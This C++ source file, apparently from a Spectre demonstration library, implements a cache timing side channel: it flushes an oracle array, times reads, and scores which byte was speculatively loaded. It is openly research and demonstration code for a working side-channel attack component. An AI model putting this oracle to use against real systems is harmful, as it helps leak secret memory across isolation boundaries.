/*
 * Copyright 2019 Google LLC
 *
 * Licensed under both the 3-Clause BSD License and the GPLv2, found in the
 * LICENSE and LICENSE.GPL-2.0 files, respectively, in the root directory.
 *
 * SPDX-License-Identifier: BSD-3-Clause OR GPL-2.0
 */

#include <list>
#include <vector>

#include "asm/measurereadlatency.h"
#include "cache_sidechannel.h"
#include "instr.h"
#include "utils.h"

// Returns the indices of the biggest and second-biggest values in the range.
template <typename RangeT>
static std::pair<size_t, size_t> TwoTwoIndices(const RangeT &range) {
  std::pair<size_t, size_t> result = {256, 256};  // first and second biggest
  for (size_t i = 0; i < range.size(); ++i) {
    if (range[i] > range[result.first]) {
      result.second = result.first;
      result.first = i;
    } else if (range[i] > range[result.second]) {
      result.second = i;
    }
  }
  return result;
}

const std::array<BigByte, 256> &CacheSideChannel::GetOracle() const {
  return padded_oracle_array_->oracles_;
}

void CacheSideChannel::FlushOracle() const {
  // Flush out entries from the timing array. Now, if they are loaded during
  // speculative execution, that will warm the cache for that entry, which
  // can be detected later via timing analysis.
  for (BigByte &b : padded_oracle_array_->oracles_) {
    FlushDataCacheLineNoBarrier(&b);
  }
  MemoryAndSpeculationBarrier();
}

std::pair<bool, char> CacheSideChannel::RecomputeScores(
    char safe_offset_char) {
  std::array<uint64_t, 256> latencies = {};
  size_t best_val = 0, runner_up_val = 0;

  // Here's the timing side channel: find which char was loaded by measuring
  // latency. Indexing into oracle causes the relevant region of
  // memory to be loaded into cache, which makes it faster to load again than
  // it is to load entries that had not been accessed.
  // Only two offsets will have been accessed: safe_offset_char (which we
  // ignore), and i.
  // Note: if the character at safe_offset_char is the same as the character we
  // want to know at i, the data from this run will be useless, but later runs
  // will use a different safe_offset_char.
  for (size_t i = 0; i < 256; ++i) {
    // Some CPUs (e.g. AMD Ryzen 5 PRO 2400G) prefetch cache lines, rendering
    // them all equally fast. Therefore it is necessary to confuse them by
    // accessing the offsets in a pseudo-random order.
    size_t mixed_i = ((i * 167) + 13) & 0xFF;
    latencies[mixed_i] = MeasureReadLatency(&GetOracle()[mixed_i]);
  }

  std::list<uint64_t> sorted_latencies_list(latencies.begin(), latencies.end());
  // We have to use the std::list::sort implementation, because invocations of
  // std::sort, std::stable_sort, std::nth_element and std::partial_sort when
  // compiled with optimizations intervene with the neural network based AMD
  // memory disambiguation dynamic predictor and the Spectre v4 example fails
  // on AMD Ryzen 5 PRO 2400G.
  sorted_latencies_list.sort();
  std::vector<uint64_t> sorted_latencies(sorted_latencies_list.begin(),
                                         sorted_latencies_list.end());
  uint64_t median_latency = sorted_latencies[128];

  // The difference between a cache-hit and cache-miss times is significantly
  // different across platforms. Therefore we must first compute its estimate
  // using the safe_offset_char which should be a cache-hit.
  uint64_t hitmiss_diff = median_latency - latencies[
      static_cast<size_t>(static_cast<unsigned char>(safe_offset_char))];

  int hitcount = 0;
  for (size_t i = 0; i < 256; ++i) {
    if (latencies[i] < median_latency - hitmiss_diff / 2 &&
        i != safe_offset_char) {
      ++hitcount;
    }
  }

  // If there is not exactly one hit, we consider that sample invalid and
  // skip it.
  if (hitcount == 1) {
    for (size_t i = 0; i < 256; ++i) {
      if (latencies[i] < median_latency - hitmiss_diff / 2 &&
          i != safe_offset_char) {
        ++scores_[i];
      }
    }
  }

  std::tie(best_val, runner_up_val) = TwoTwoIndices(scores_);
  return std::make_pair((scores_[best_val] > 2 * scores_[runner_up_val] + 40),
                        best_val);
}

std::pair<bool, char> CacheSideChannel::AddHitAndRecomputeScores() {
  static size_t additional_offset_counter = 0;
  size_t mixed_i = ((additional_offset_counter * 167) + 13) & 0xFF;
  ForceRead(GetOracle().data() + mixed_i);
  additional_offset_counter = (additional_offset_counter + 1) % 256;
  return RecomputeScores(static_cast<char>(mixed_i));
}
